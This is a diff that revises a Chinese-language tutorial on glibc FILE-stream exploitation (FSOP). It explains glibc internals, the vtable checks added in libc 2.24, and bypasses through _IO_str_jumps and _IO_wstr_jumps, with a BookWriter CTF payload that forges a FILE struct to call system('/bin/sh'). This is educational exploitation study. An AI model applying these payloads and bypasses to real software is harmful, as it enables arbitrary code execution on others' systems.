@@ -1,4 +1,4 @@
-# FILE_IO 攻击技术解析 #
+FILE_IO 攻击技术解析
 
 ## 1. 重要更新
 
@@ -127,7 +127,7 @@ int _IO_flush_all_lockp (int do_lock)
 }
 ```
 
-### 3.2 触发 _IO_overflow
+### 3.2 触发 _IO_overflow 的判定条件
 
 触发 `_IO_overflow` 函数的条件（任选其一即可）：
 
@@ -141,21 +141,28 @@ int _IO_flush_all_lockp (int do_lock)
 
 `fp->_mode` 字段是用来判断当前文件流的类型，`fp->_mode < 0` 表示使用字节流模式，因此接下来只需要判断 `_IO_write_ptr` 是否大于`_IO_write_base`（是否还有数据没有写入）。如果 `fp->_mode >= 0` 表示使用了宽字节流模式（或者当前模式未指定），此时需要检查是 `_wide_data` 结构体中是否还有未写入的数据，并且 `fp->_vtable_offset` 字段必须为0。  
 
-这里有一点需要注意的地方就是，如何修改\_IO\_list\_all字段。如果有任意地址写任意值的漏洞，这自然不用说，将其改到一个我们可以直接控制的地址即可。还有一种情况在heap利用中较为常见，利用unsortedbin attack能达到任意地址写固定值（&main\_arena->topchunk），此时我们就要利用\_IO\_FILE的chain字段了。  
+这里有一点需要注意的地方就是，如何修改 `_IO_list_all` 字段。如果有任意地址写任意值的漏洞，这自然不用说，将其改到一个我们可以直接控制的地址即可。还有一种情况在堆利用中较为常见，就是利用 `unsortedbin attack` 达到任意地址写固定值（`main_arena->topchunk` 的地址，一个 libc 值），此时我们就要利用 `_IO_FILE->chain` 字段了。  
 
-**这里有一点需要注意，不是只能通过unsortedbin attack改写IO\_list\_all然后触发错误机制采用使用FSOP，如果我们有一个任意地址写漏洞，那么可以直接进行改写。同时，fwrite函数在满足一定条件下同样会调用overflow函数。**
+**注：这里有一点需要注意，不是只能通过 unsortedbin attack 改写 IO_list_all 来触发 overflow，如果我们有一个任意地址写漏洞，那么可以直接进行改写。同时，fwrite 函数在满足一定条件下同样会调用 overflow 函数。**
 
-由于此时\_IO\_list\_all = &main\_arena->topchunk，因此chain字段的地址就为 &main\_arena->topchunk + 0x68（64bit，32位下+0x34），也就是落到了bin[5]（64bit下为smallbin 0x60，32位下为smallbin 0x30）链表范围内。这样如果我们能伪造一个在该范围内的chunk并free它（要确保其落入smallbin，而不是待在unsortedbin中），就可以成功触发漏洞。
+### 3.3 利用 unsortedbin attack 触发 overflow
 
-那么如何才能保证即触发unsortedbin attack修改IO\_list\_all，又能修改在0x60的smallbin中放入一个预先布置好的堆块呢？  
-方法就是：在修改unsortedbin的bk字段的同时，修改unsortedbin的size字段为0x61，然后再分配一个不等于0x60的chunk。这样由于unsortedbin的机制，请求的size大小不等于当前分配的chunk，会将该chunk先扔进对应的smallbin，继续遍历unsortedbin。  
-![check1](https://raw.githubusercontent.com/fade-vivida/libc-linux-source-code-study/master/libc_study/picture/check2.png)  
-其实此时还绕过了另一个检查，由于`bck != unsorted_chunks (av)`，导致该unsortedbin不会切割分配。  
-![check2](https://raw.githubusercontent.com/fade-vivida/libc-linux-source-code-study/master/libc_study/picture/check1.png)  
+由于此时 `_IO_list_all = &main_arena->topchunk`，因此 `_IO_FILE->chain` 字段正好位于 `&main_arena->topchunk + 0x68（64bit，32位下+0x34）`，也就是落到了 `bin[5]`（64bit下为 `smallbin` 0x60，32位下为 `smallbin` 0x30）链表范围内。这样如果我们能伪造一个在该范围内的 `chunk` 并 free 它（要确保其落入 `smallbin`，而不是待在 `unsortedbin` 中），就可以成功触发漏洞。
 
+那么如何才能保证即触发 `unsortedbin attack` 修改 `_IO_list_all`，又能修改在 0x60 的 `smallbin` 中放入一个预先布置好的堆块呢？ 
+**方法就是**：在修改 `unsortedbin->bk` 字段的同时，修改 `unsortedbin->size` 字段为 0x61，然后再分配一个大于 0x60 的 `chunk`。这样由于 `unsortedbin` 的分配机制，请求的 size 大小不等于当前 `unsortedbin` 中的 `chunk`，会将该 `chunk`先扔进对应的 `smallbin`，继续遍历 `unsortedbin`。 
 
-一个代码实例如下所示（pwnable.tw BookWriter）：
-<pre class = "prettyprint lang-javascript">
+![check2](../\picture\check2.png)
+
+其实此时还绕过了另一个检查，由于`bck != unsorted_chunks (av)`，导致该 `unsortedbin` 不会切割分配。 
+
+![check1](../picture/check1.png)
+
+  
+
+一个利用实例如下所示（`pwnable.tw BookWriter`）：
+
+```python
 fake_bk = io_list_all - 0x10
 fake_fd = top_addr
 payload += '/bin/sh\0' + p64(0x61) + p64(fake_fd) + p64(fake_bk)
@@ -163,6 +170,7 @@ payload += p64(2) + p64(3)
 payload += (0xc0-0x30)*'\x00' + p64(0)	//_mode
 payload += '\x00'*0x10 + p64(heap_addr+0x160+0xd8+8)
 payload += p64(0)*2 + p64(1) + p64(system_addr)
+
 
 另一种写法：
 payload += pack_file_64(_flags = u64('/bin/sh\0'),
@@ -174,11 +182,12 @@ payload += pack_file_64(_flags = u64('/bin/sh\0'),
 vtalbe = heap_addr+0x160+0xd8+8
 payload += p64(vtalbe)
 payload += p64(0)*2 + p64(system_addr) + p64(system_addr)
-</pre>
-## 2. FSOP防御机制（libc2.24之后的利用方法） ##
-从libc2.24开始，加入了对于vtable的检查函数，即在<a href = "#6">2.3小节</a>提到的IO\_validata\_vtable和\_IO\_vtable\_check两个函数。
+```
 
-<pre class="prettyprint lang-javascript"> 
+## 4. FSOP 防御机制（libc 2.24 之后的利用方法） ##
+从 libc2.24 开始，加入了对于 `vtable` 的检查函数，即 `IO_validata_vtable()` 和 `_IO_vtable_check()`两个函数。
+
+```c++
 static inline const struct _IO_jump_t *
 IO_validate_vtable (const struct _IO_jump_t *vtable)
 {
@@ -191,10 +200,12 @@ IO_validate_vtable (const struct _IO_jump_t *vtable)
 		_IO_vtable_check ();
 	return vtable;
 }
-</pre>
-其中IO\_validate\_vtable函数主要检查当前vtable是否在正常范围内（\_\_libc\_IO\_vtables section，该节的属性为只读）。如果不在则调用\_IO\_vtable\_check函数进行更为细致的检查。  
+```
+
+其中 `IO_validate_vtable` 函数主要检查当前vtable是否在正常范围内（`__start___libc_IO_vtables ~ __stop___libc_IO_vtabls`）。如果不在则调用`_IO_vtable_check` 函数进行更为细致的检查。  
 
 \_IO\_vtable\_check函数源代码如下所示：
+```c++
 <pre class="prettyprint lang-javascript"> 
 void attribute_hidden
 _IO_vtable_check (void)
@@ -220,36 +231,40 @@ _IO_vtable_check (void)
 			&& l->l_ns != LM_ID_BASE))
       		return;
   	}
-
-	#else /* !SHARED */
-	/* We cannot perform vtable validation in the static dlopen case
-	because FILE * handles might be passed back and forth across the
-	boundary.  Therefore, we disable checking in this case.  */
+  	#else /* !SHARED */
+/* We cannot perform vtable validation in the static dlopen case
+because FILE * handles might be passed back and forth across the
+boundary.  Therefore, we disable checking in this case.  */
   	if (__dlopen != NULL)
 		return;
 	#endif
 	__libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
 }
-</pre>
 
-该函数大体意思为：如果定义了SHARED，则需要检查是否设定了接受外来vtables。如果是则直接返回，除此之外还会检查是否设置了\_dl\_open\_hook
+```
 
-（**注：这里有一种攻击方法就是通过各种改写\_dl\_open\_hook的值，使其不为0，然后就可以利用libc2.24之前的方法伪造vtable表**）  
+该函数大体意思为：如果定义了 `SHARED` 宏，则需要检查是否设定了接受外来 `vtables`。如果是则直接返回。
 
-## 3. 绕过FSOP防御机制 ##
-从libc2.24开始，libc加入了针对文件流虚表（vtable）的检测机制。下面介绍针对该检测机制的两种绕过方法。
-### 3.1 改写\_dl\_open\_hook ###
-该方法已在2中进行了表述，其实就是通过其他漏洞改写了dl\_open\_hook后，在按无检查的时候利用即可。
-### 3.2 利用\_IO\_str\_jumps ###
+（**注：这里有一种攻击方法就是通过各种改写 _dl_open_hook 的值，使其不等于 0，然后就可以利用 libc2.24 之前的方法伪造 vtable 表**）  
 
+## 5. 绕过 FSOP 防御机制 ##
+从 libc2.24 开始，libc 加入了针对文件流虚表（`vtable`）的检测机制。
 
-由于在新的检测机制下，会检查虚表的地址是否在规定的合法范围内，因此我们无法再伪造vtable结构。既然无法将 vtable 指针指向 \_\_libc\_IO\_vtables 以外的地方，那么就在 \_\_libc\_IO\_vtables 里面找些有用的东西。比如 \_IO\_str\_jumps（该符号在strip后会丢失），但我们可以根据\_IO\_file\_jumps以及相对偏移（一般来说为0xc0，但具体使用时还需要视情况而定）来计算它的相对位置。
+下面介绍针对该检测机制的两种绕过方法。
 
-下面是\_IO\_str\_jumps虚表结构体的相关成员
-<pre class = "prettyprint lang-javascript">
+### 5.1 改写 _dl_open_hook ###
+该方法已在第 4 小姐中进行了表述，其实就是通过其他漏洞改写了 `dl_open_hook` 后，再按无检查的时候利用即可。
+### 5.2 利用 _IO_str_jumps ###
+
+由于在新的检测机制下，会检查虚表的地址是否在规定的合法范围内，因此我们无法再伪造 `vtable` 结构。既然无法将 `vtable` 指针指向 `__libc_IO_vtables` 以外的地方，那么就在 `__libc_IO_vtables` 里面找些有用的东西。比如 `_IO_str_jumps` 。
+
+**注：在发行版本中 _IO_str_jumps 符号会丢失，但我们可以根据 _IO_file_jumps 以及相对偏移（一般来说为0xc0，但具体使用时还需要视情况而定）来计算它的相对位置。**
+
+下面是 `_IO_str_jumps` 虚表结构体的相关成员
+
+```c++
 // libio/strops.c
 #define JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0)
-
 const struct _IO_jump_t _IO_str_jumps libio_vtable =
 {
   JUMP_INIT_DUMMY,
@@ -273,10 +288,11 @@ const struct _IO_jump_t _IO_str_jumps libio_vtable =
   JUMP_INIT(showmanyc, _IO_default_showmanyc),
   JUMP_INIT(imbue, _IO_default_imbue)
 };
-</pre>
-\_IO\_strfile结构体
+```
 
-<pre class = "prettyprint lang-javascript">
+另一个十分重要的结构体 `_IO_strfile_` 
+
+```c++
 struct _IO_str_fields
 {
   _IO_alloc_type _allocate_buffer;		//函数指针
@@ -294,12 +310,14 @@ typedef struct _IO_strfile_
   struct _IO_streambuf _sbf;
   struct _IO_str_fields _s;		//虚表
 } _IO_strfile;
-</pre>
-在这个vtable中有两个函数我们可以拿来利用，\_IO_str\_overflow和\_IO\_str\_finish。
+```
 
-#### 3.2.1 \_IO\_str\_overflow利用方法 ####
-其中\_IO\_str\_overflow代码如下所示：
-<pre class = "prettyprint lang-javascript">
+在这个 `vtable` 中有两个函数我们可以拿来利用，`_IO_str_overflow` 和 `_IO_str_finish`。
+
+#### 5.2.1 \_IO\_str\_overflow 利用方法 ####
+其中 `_IO_str_overflow` 代码如下所示：
+
+```c++
 int _IO_str_overflow (_IO_FILE *fp, int c)
 {
   int flush_only = c == EOF;
@@ -328,68 +346,86 @@ int _IO_str_overflow (_IO_FILE *fp, int c)
 		new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);     
 		// 在这个相对地址放上 system 的地址，即 system("/bin/sh")
     [...]
-</pre>
-因此我们可以下面的方式对fp指针进行构造：
-所以可以像下面这样构造：
+```
 
-    fp->_flags = 0
-    fp->_IO_buf_base = 0
-    fp->_IO_buf_end = (bin_sh_addr - 100) / 2		//如果之后替换的时one_gadget而不是system，则不用这一步
-    fp->_IO_write_ptr = 0xffffffffff	//这里需要注意，该值不能过小
-    fp->_IO_write_base = 0			//实际就是_IO_write_ptr >_IO_write_base
-    fp->_mode = 0
-其中fp->\_IO\_write\_ptr的值我们之所以要设置为一个比较大的数是为了绕过`pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)`检查。
+因此我们可以像下面的方式对 `_IO_FILE` 指针进行构造：
 
-此时，根据代码所示可以推导出如下等式：  
-`old_blen = _IO_blen(fp) = fp->_IO_buf_end - _IO_buf_base = _IO_buf_end`  
-`new_size = 2 * old_blen + 100 = 2*_IO_buf_end + 100 = (bin_sh_addr - 100）/ 2 * 2 + 100 = bin_sh_addr`  
+```python
+fp->_flags = 0
+fp->_IO_buf_base = 0
+
+fp->_IO_buf_end = (bin_sh_addr - 100) / 2		、
+# 如果之后替换的时 one_gadget 而不是 system，则不用这一步
+
+fp->_IO_write_ptr = 0xffffffffff	
+# 这里需要注意，一般而言只需要 _IO_write_ptr > _IO_write_base
+# 但如果我们是通过 fputs 等函数触发，则还需要将 _IO_write_ptr 赋值为一个可写的地址
+
+fp->_IO_write_base = 0			
+# 实际就是_IO_write_ptr >_IO_write_base
+fp->_mode = 0
+```
+其中 `fp->_IO_write_ptr` 的值我们之所以要设置为一个比较大的数是为了绕过 `pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)`检查。
+
+此时，根据代码所示可以推导出如下公式：
+
+1. `old_blen = _IO_blen(fp) = fp->_IO_buf_end - _IO_buf_base = _IO_buf_end` 
+2. `new_size = 2 * old_blen + 100 = 2*_IO_buf_end + 100 = (bin_sh_addr - 100）/ 2 * 2 + 100 = bin_sh_addr` 
+
 这样我们就布置好了system函数需要调用的参数，接下来就是如何控制程序执行流程了。
 
-我们注意到在\_IO\_str\_overflow函数中有这样一行代码
+我们注意到在 `_IO_str_overflow` 函数中有这样一行代码
 
 	new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); 
-可以看到在该函数中有一个虚表调用，调用的函数地址为相对fp偏移0xe0（64bit）的\_allocate\_buffer函数，如果我们把该地址的内容替换为system函数，不就可以劫持程序控制流了吗？确实如此！我们只要在fp+0xe0（也就是紧跟在虚表后的地址）的位置放置system函数（或者one\_gadget）的指针即可劫持控制流。  
-**有一点要注意的是，如果 bin\_sh\_addr 的地址以奇数结尾，为了避免除法向下取整的干扰，可以将该地址加 1。另外 system("/bin/sh") 是可以用 one\_gadget 来代替的，这样似乎更加简单。**
+可以看到在该函数中有一个虚表调用，调用的函数地址为相对 `_IO_FILE` 偏移为 0xe0（64bit）的 `_allocate_buffer` 函数，如果我们把该地址的内容替换为`system` 函数，不就可以劫持程序控制流了吗？
 
-利用\_IO\_str\_overflow的完成调用过程（还有其他的利用路径，本文只列出了针对malloc\_printerr的情况）：
+确实如此！我们只要在 `_IO_FILE` + 0xe0（也就是紧跟在虚表后的地址）的位置放置 `system` 函数（或者 `one\_gadget`）的指针即可劫持控制流。 **但有一点要注意的是，如果 bin_sh_addr 的地址以奇数结尾，为了避免除法向下取整的干扰，可以将该地址加 1。另外 system("/bin/sh") 是可以用 one_gadget 来代替的，这样似乎更加简单。**
+
+利用 `_IO_str_overflow` 的完整调用过程（还有其他的利用路径，本文只列出了针对 `malloc_printerr` 的情况）：
 
 	malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_overflow
-#### 3.2.2 \_IO\_str\_finish利用方法 ####
-在vtable中还有另一个函数可以利用，就是\_IO\_str\_finish，该函数的利用方式较为简单，下面我们先看看该函数的代码。
-<pre class = "prettyprint lang-javascript">
+#### 5.2.2 \_IO\_str\_finish 利用方法 ####
+在 `vtable` 中还有另一个函数可以利用，就是 `_IO_str_finish`，该函数的利用方式较为简单，下面我们先看看该函数的代码。
+```c++
 void _IO_str_finish (_IO_FILE *fp, int dummy)
 {
   if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))             // 条件
     (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);     // 在这个相对地址放上 system 的地址
   fp->_IO_buf_base = NULL;
 
+
   _IO_default_finish (fp, 0);
 }
-</pre>
-我们只要让 fp->\_IO\_buf\_base 等于"/bin/sh" 的地址，然后设置 fp->_flags = 0 就可以了绕过函数里的条件。
+```
 
-接下来的关键就是如何控制程序执行流程到\_IO\_str\_finish。一个显而易见的方法为调用fclose函数，但这用方法有局限性，不是每个程序都会调用fclose。那么还有没有一条其他的路径呢？答案是有！，我们还是利用异常处理。
+我们只要让 `fp->_IO_buf_base` 等于 `/bin/sh` 的地址，然后设置 `fp->_flags = 0` 就可以了绕过函数里的条件。
 
-通过前面对\_IO\_flush\_all\_lockp 函数的分析，我们知道该函数最终会调用 \_IO\_OVERFLOW执行 \_\_GI\_\_IO\_str\_overflow，而 \_IO\_OVERFLOW 是根据 \_\_overflow 相对于 \_IO\_str\_jumps vtable 的偏移（64bit，offset = 0x18）找到具体函数的。所以如果我们伪造传递给 \_IO\_OVERFLOW(fp) 的 fp->vtable 为 \_IO\_str\_jumps 减去 0x8，那么根据偏移（+0x18），程序将找到 \_IO\_str\_finish (\_IO\_str\_jumps - 0x8 + 0x18 = \_IO\_str\_jumps + 0x10）并执行。
+接下来的关键就是如何控制程序执行流程到 `_IO_str_finish`。一个显而易见的方法为调用 `fclose` 函数，但这用方法有局限性，不是每个程序都会调用 `fclose`。那么还有没有一条其他的路径呢？答案是有！，我们还是利用异常处理。
+
+通过前面对 `_IO_flush_all_lockp` 函数的分析，我们知道该函数最终会调用 `_IO_OVERFLOW` 执行 `__GI__IO_str_overflow`，而 `_IO_OVERFLOW` 的调用是根据 `__overflow` 相对于 `_IO_str_jumps->vtable` 的偏移（64bit，offset = 0x18）找到具体函数的。所以如果我们伪造传递给 `_IO_OVERFLOW(fp)` 的 `fp->vtable` 为 `_IO_str_jumps - 0x8`，那么根据偏移（`offset=0x18`），程序将找到 `_IO_str_finish` (\_IO\_str\_jumps - 0x8 + 0x18 = \_IO\_str\_jumps + 0x10）并执行。
 
 所以可以像下面这样构造：
 
-	fp->_flag = 0
-	fp->_mode = 0
-	fp->_IO_write_ptr = 0xffffffff	
-	fp->_IO_write_base = 0		//_IO_write_ptr > _IO_write_base 即可
-	fp->_IO_buf_base = bin_sh_addr
+```python
+fp->_flag = 0
+fp->_mode = 0
+fp->_IO_write_ptr = 0xffffffff	
+fp->_IO_write_base = 0		#_IO_write_ptr > _IO_write_base 即可
+fp->_IO_buf_base = bin_sh_addr
+```
 
 完整的调用过程：
 
 	malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_finish
 
-### 3.3 利用\_IO\_wstr\_jumps ###
-\_IO\_wstr\_jumps 也是一个符合条件的 vtable，总体上和上面讲的 \_IO\_str\_jumps 差不多。
+### 5.3 利用 \_IO\_wstr\_jumps ###
+`_IO_wstr_jumps` 也是一个符合条件的 `vtable`，总体上和上面讲的 `_IO_str_jumps` 差不多。
 
-\_IO\_wstr\_jumps虚表结构如下所示：
-<pre class = "prettyprint lang-javascript">
+`_IO_wstr_jumps` 虚表结构如下所示：
+
+```c++
 // libio/wstrops.c
+
 
 const struct _IO_jump_t _IO_wstr_jumps libio_vtable =
 {
@@ -438,17 +474,18 @@ _IO_wint_t _IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c)
 	  		wchar_t *old_buf = fp->_wide_data->_IO_buf_base;
 	  		size_t old_wblen = _IO_wblen (fp);
 	  		_IO_size_t new_size = 2 * old_wblen + 100;              // 使 new_size * sizeof(wchar_t) 为 "/bin/sh" 的地址
+            		if (__glibc_unlikely (new_size < old_wblen)
+      		|| __glibc_unlikely (new_size > SIZE_MAX / sizeof (wchar_t)))
+    		return EOF;
 
-	  		if (__glibc_unlikely (new_size < old_wblen)
-	      		|| __glibc_unlikely (new_size > SIZE_MAX / sizeof (wchar_t)))
-	    		return EOF;
-	
-	  		new_buf = (wchar_t *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size * sizeof (wchar_t));    // 在这个相对地址放上 system 的地址
-	[...]
-</pre>
-其他的都没有发生变化，唯一需要注意的就是其中条件判断的字段都变为了fp->\_wide_data字段。  
+  		new_buf = (wchar_t *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size * sizeof (wchar_t));    // 在这个相对地址放上 system 的地址
+          
+[...]
+```
 
-_IO_wide_data 字段的定义如下所示：
+其他的都没有发生变化，唯一需要注意的就是其中条件判断的字段都变为了 `fp->_wide_data` 字段。  
+
+`_IO_wide_data` 字段的定义如下所示：
 
 ```c++
 struct _IO_wide_data
@@ -477,11 +514,9 @@ struct _IO_wide_data
 };
 ```
 
+利用函数 `_IO_wstr_finish`：
 
-
-利用函数 \_IO\_wstr\_finish：
-
-<pre class = "prettyprint lang-javascript">
+```c++
 void _IO_wstr_finish (_IO_FILE *fp, int dummy)
 {
   if (fp->_wide_data->_IO_buf_base && !(fp->_flags2 & _IO_FLAGS2_USER_WBUF))    // 条件
@@ -489,4 +524,5 @@ void _IO_wstr_finish (_IO_FILE *fp, int dummy)
   fp->_wide_data->_IO_buf_base = NULL;
   _IO_wdefault_finish (fp, 0);
 }
-</pre>
+```
+
